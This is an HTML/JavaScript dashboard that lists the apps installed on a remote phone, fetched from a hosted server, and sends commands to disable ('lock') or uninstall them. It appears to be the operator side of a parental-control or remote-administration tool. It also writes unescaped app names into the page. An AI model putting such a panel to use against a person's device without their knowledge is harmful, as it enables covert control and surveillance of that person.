<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>App Manager - Control Panel</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-color: #0f172a;
            --list-bg: #1e293b;
            --list-hover: #2d3e55;
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --accent: #3b82f6;
            --danger: #ef4444;
            --warning: #f59e0b; /* New Color for Disable */
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-primary);
            font-family: 'Poppins', sans-serif;
            padding-bottom: 50px;
        }

        /* HEADER */
        .app-header {
            background: rgba(30, 41, 59, 0.95);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            position: sticky;
            top: 0;
            z-index: 1000;
            padding: 15px 0;
        }

        /* SEARCH BAR */
        .search-container { position: relative; margin-top: 10px; }
        .search-input {
            background: #334155; border: none; color: white;
            padding: 12px 45px; border-radius: 12px; width: 100%;
        }
        .search-input:focus { outline: none; box-shadow: 0 0 0 2px var(--accent); }
        .search-icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--text-secondary); }

        /* ðŸ”¥ LIST VIEW STYLE ðŸ”¥ */
        .app-item {
            background: var(--list-bg);
            border-radius: 12px;
            padding: 12px 15px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            cursor: pointer;
            transition: all 0.2s;
            border: 1px solid rgba(255,255,255,0.05);
        }

        .app-item:hover {
            background: var(--list-hover);
            transform: translateX(5px);
            border-color: var(--accent);
        }

        .app-icon {
            width: 45px; height: 45px;
            border-radius: 10px;
            object-fit: cover;
            margin-right: 15px;
            background: #000;
        }

        .app-details { flex-grow: 1; overflow: hidden; }
        .app-name { font-weight: 600; font-size: 1rem; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .pkg-name { font-size: 0.75rem; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

        .arrow-icon { color: var(--text-secondary); font-size: 0.9rem; }

        /* ðŸ”¥ MODAL STYLES (POPUP) ðŸ”¥ */
        .modal-content {
            background-color: #1e293b;
            color: #fff;
            border: 1px solid #334155;
            border-radius: 15px;
        }
        .modal-header { border-bottom: 1px solid #334155; }
        .modal-footer { border-top: 1px solid #334155; display: block; } /* Changed to block for full width buttons */
        .btn-close-white { filter: invert(1); }

        .big-icon {
            width: 80px; height: 80px;
            border-radius: 20px;
            display: block;
            margin: 10px auto;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        }

        .info-row {
            display: flex; justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            font-size: 0.9rem;
        }
        .info-label { color: var(--text-secondary); }
        .info-val { color: #fff; font-family: monospace; }

        /* BUTTONS */
        /* Disable Button (Yellow/Orange) */
        .btn-action-disable { 
            width: 100%; 
            background: var(--warning); 
            border: none; 
            padding: 12px; 
            border-radius: 8px; 
            color: #000; /* Black text for contrast */
            font-weight: 700; 
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .btn-action-disable:hover {
            background: #d97706; /* Darker orange */
        }

        /* Uninstall Button (Red) */
        .btn-action-uninstall { 
            width: 100%; 
            background: rgba(239, 68, 68, 0.15); 
            border: 1px solid var(--danger);
            padding: 12px; 
            border-radius: 8px; 
            color: var(--danger); 
            font-weight: 600; 
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .btn-action-uninstall:hover {
            background: var(--danger);
            color: white;
        }

    </style>
</head>
<body>

    <header class="app-header">
        <div class="container">
            <div class="d-flex align-items-center justify-content-between">
                <div class="d-flex align-items-center">
                    <a href="index.html" class="text-secondary me-3 fs-5"><i class="fas fa-arrow-left"></i></a>
                    <h5 class="m-0 fw-bold">App List</h5>
                    <span class="badge bg-primary ms-2" id="appCount">0</span>
                </div>
                <button class="btn btn-sm btn-outline-light" onclick="manualRefresh()">
                    <i class="fas fa-sync-alt"></i> <span id="liveText">Live</span>
                </button>
            </div>
            <div class="search-container">
                <i class="fas fa-search search-icon"></i>
                <input type="text" id="searchInput" class="search-input" placeholder="Search installed apps..." onkeyup="filterApps()">
            </div>
        </div>
    </header>

    <div class="container mt-3">
        <div id="appsContainer">
            </div>
        <div id="statusMsg" class="text-center text-muted mt-5">Loading...</div>
    </div>

    <div class="modal fade" id="appDetailModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Manage App</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <img id="modalIcon" src="" class="big-icon">
                    <h4 id="modalName" class="text-center fw-bold mt-2">App Name</h4>
                    <p id="modalPkg" class="text-center text-secondary small">com.package.name</p>

                    <div class="mt-4">
                        <div class="info-row">
                            <span class="info-label">Version</span>
                            <span class="info-val" id="modalVersion">--</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Installed</span>
                            <span class="info-val" id="modalDate">--</span>
                        </div>
                        <div class="info-row border-0">
                            <span class="info-label">Path</span>
                            <span class="info-val text-truncate" style="max-width: 60%;" id="modalPath">/data/app/...</span>
                        </div>
                    </div>
                </div>
                
                <div class="modal-footer">
                    <button class="btn-action-disable" onclick="sendDisableCommand()">
                        <i class="fas fa-ban"></i> DISABLE / LOCK APP
                    </button>
                    
                    <button class="btn-action-uninstall" onclick="sendUninstallCommand()">
                        <i class="fas fa-trash"></i> Uninstall App
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id') || urlParams.get('deviceId');
        const storageKey = `apps_${DEVICE_ID}`;
        
        let allApps = [];
        let currentAppPkg = ""; 
        let refreshInterval;

        document.addEventListener("DOMContentLoaded", () => {
            if (!DEVICE_ID) {
                alert("ID Missing!");
                window.location.href = "index.html";
                return;
            }
            loadFromStorage();
            sendCommand();
            startLiveUpdates();
        });

        function startLiveUpdates() {
            fetchApps();
            refreshInterval = setInterval(() => { fetchApps(); }, 3000); 
        }

        function manualRefresh() {
            document.getElementById("liveText").innerText = "Updating...";
            sendCommand();
            setTimeout(fetchApps, 1000);
        }

        function loadFromStorage() {
            const savedData = localStorage.getItem(storageKey);
            if (savedData) {
                const data = JSON.parse(savedData);
                allApps = data;
                renderApps(data);
            }
        }

        function sendCommand() {
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'apps' })
            }).catch(e => console.log(e));
        }

        function fetchApps() {
            const t = new Date().getTime();
            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/apps?t=${t}`)
                .then(res => res.json())
                .then(data => {
                    document.getElementById("liveText").innerText = "Live";
                    if (data && Array.isArray(data) && data.length > 0) {
                        localStorage.setItem(storageKey, JSON.stringify(data));
                        allApps = data;
                        document.getElementById("statusMsg").style.display = 'none';
                        if(document.getElementById('searchInput').value === "") {
                            renderApps(data);
                        }
                    }
                })
                .catch(() => document.getElementById("liveText").innerText = "Offline");
        }

        // ðŸ”¥ RENDER AS LIST ðŸ”¥
        function renderApps(data) {
            const container = document.getElementById("appsContainer");
            document.getElementById("appCount").innerText = data.length;
            container.innerHTML = "";

            data.sort((a, b) => a.appName.localeCompare(b.appName));

            data.forEach(app => {
                let iconSrc = app.icon && app.icon.length > 20 
                    ? `data:image/webp;base64,${app.icon}` 
                    : 'https://cdn-icons-png.flaticon.com/512/160/160139.png';

                const div = document.createElement("div");
                div.className = "app-item";
                div.onclick = function() { openDetailsModal(app); };

                div.innerHTML = `
                    <img src="${iconSrc}" class="app-icon">
                    <div class="app-details">
                        <div class="app-name">${app.appName}</div>
                        <div class="pkg-name">${app.packageName}</div>
                    </div>
                    <i class="fas fa-chevron-right arrow-icon"></i>
                `;
                container.appendChild(div);
            });
        }

        function filterApps() {
            const q = document.getElementById('searchInput').value.toLowerCase();
            const filtered = allApps.filter(app => 
                (app.appName && app.appName.toLowerCase().includes(q)) || 
                (app.packageName && app.packageName.toLowerCase().includes(q))
            );
            renderApps(filtered);
        }

        // ðŸ”¥ OPEN MODAL ðŸ”¥
        function openDetailsModal(app) {
            currentAppPkg = app.packageName;

            document.getElementById("modalName").innerText = app.appName;
            document.getElementById("modalPkg").innerText = app.packageName;
            
            let iconSrc = app.icon && app.icon.length > 20 
                    ? `data:image/webp;base64,${app.icon}` 
                    : 'https://cdn-icons-png.flaticon.com/512/160/160139.png';
            document.getElementById("modalIcon").src = iconSrc;

            document.getElementById("modalVersion").innerText = app.versionName || "Unknown";
            document.getElementById("modalDate").innerText = app.installDate || "N/A";
            document.getElementById("modalPath").innerText = `/data/user/0/${app.packageName}`;

            const myModal = new bootstrap.Modal(document.getElementById('appDetailModal'));
            myModal.show();
        }

        // --- UPDATED COMMANDS ---
        
        // ðŸ”¥ DISABLE COMMAND (Replaces Open) ðŸ”¥
        function sendDisableCommand() {
            if(!currentAppPkg) return;
            
            // Confirmation Msg
            if(confirm(`Are you sure you want to LOCK ${currentAppPkg}?\nThe user will be kicked out when they try to open it.`)) {
                // Sending 'disable' command instead of 'open'
                sendCommandToDevice(`disable:${currentAppPkg}`);
                alert("Disable Command Sent! (Phone will kick user out)");
            }
        }

        function sendUninstallCommand() {
            if(!currentAppPkg) return;
            if(confirm(`Request uninstall for ${currentAppPkg}?`)) {
                sendCommandToDevice(`uninstall:${currentAppPkg}`);
            }
        }

        function sendCommandToDevice(cmd) {
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: cmd })
            });
        }

    </script>
</body>
</html>
